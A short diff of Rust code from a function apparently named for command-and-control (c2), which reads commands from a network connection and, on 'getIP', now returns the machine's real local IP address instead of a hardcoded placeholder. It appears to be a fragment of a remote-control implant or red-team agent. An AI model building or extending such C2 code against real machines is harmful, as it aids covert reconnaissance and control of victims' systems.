@@ -90,10 +90,9 @@ fn c2(ip:&str) {
         }
         let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
         if recv.contains("getIP") { //if it's getIP, return the IP
-            // let local_ip = local_ip().unwrap(); //get the local IP
-            // let local_ip = format!("{}\n",local_ip); //format IP into string
-            // let local_ip = local_ip.as_bytes();
-            let local_ip = "10.1.1.1".as_bytes();
+            let local_ip = local_ip().unwrap(); //get the local IP
+            let local_ip = format!("{}\n",local_ip); //format IP into string
+            let local_ip = local_ip.as_bytes();
             stream.write(&local_ip).unwrap(); //send it
             continue;
         }
